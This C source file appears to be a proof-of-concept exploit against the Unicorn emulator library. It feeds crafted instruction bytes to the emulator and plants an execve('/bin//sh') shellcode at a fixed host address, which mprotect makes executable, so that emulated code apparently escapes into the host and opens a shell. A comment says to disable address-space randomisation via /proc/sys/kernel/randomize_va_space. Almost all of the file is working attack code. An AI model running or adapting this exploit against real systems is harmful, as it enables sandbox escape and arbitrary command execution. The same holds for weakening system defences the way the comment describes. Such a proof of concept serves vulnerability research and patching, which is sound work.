#include <stdio.h>
#include <string.h>
#include <sys/mman.h>
#include "unicorn/unicorn.h"

int syscall_abi[] = {
    UC_X86_REG_RAX, UC_X86_REG_RDI, UC_X86_REG_RSI, UC_X86_REG_RDX,
    UC_X86_REG_R10, UC_X86_REG_R8, UC_X86_REG_R9
};

uint64_t vals[7] = { 200, 10, 11, 12, 13, 14, 15 };
void* ptrs[7];

void uc_perror(const char* func, uc_err err)
{
    fprintf(stderr, "Error in %s(): %s\n", func, uc_strerror(err));
}

#define BASE 0x10000
#define CODE "\xc5\xc7\x23\x7f\xff\x05\x0a"

/* map shelllcode
 * address randomization must be bypassed and the corresponding address calculated.
 * echo 0 > /proc/sys/kernel/randomize_va_space 
 */
uint64_t *ptr = 0x00007ffff0eff000U;     
char shellcode[] = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53"
                   "\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05";

void map_shellcode() {
    mprotect(ptr, 0x10000, PROT_READ | PROT_WRITE | PROT_EXEC);
    memcpy(ptr, shellcode, sizeof shellcode);
}

int main()
{
    int i;
    uc_hook sys_hook;
    uc_err err;
    uc_engine* uc;

    if ((err = uc_open(UC_ARCH_X86, UC_MODE_64, &uc))) {
        uc_perror("uc_open", err);
        return 1;
    }
    
    /* 1. initialize register */
    for (i = 0; i < 7; i++) {
        ptrs[i] = &vals[i];
    }

    printf("reg_write_batch({200, 10, 11, 12, 13, 14, 15})\n");
    if ((err = uc_reg_write_batch(uc, syscall_abi, ptrs, 7))) {
        uc_perror("uc_reg_write_batch", err);
        return 1;
    }

    /* 2. map target instructions */
    if ((err = uc_mem_map(uc, BASE, 0x1000, UC_PROT_ALL))) {
        uc_perror("uc_mem_map", err);
        uc_close(uc);
        return 1;
    }

    if ((err = uc_mem_write(uc, BASE, CODE, sizeof(CODE) - 1))) {
        uc_perror("uc_mem_write", err);
        uc_close(uc);
        return 1;
    }

    /* 3. map shellcode */
    map_shellcode();

    /* 4. start emulator */
    if ((err = uc_emu_start(uc, BASE, BASE + sizeof(CODE) - 1, 0, 0))) {
        uc_perror("uc_emu_start", err);
        uc_close(uc);
        return 1;
    }

    return 0;
}
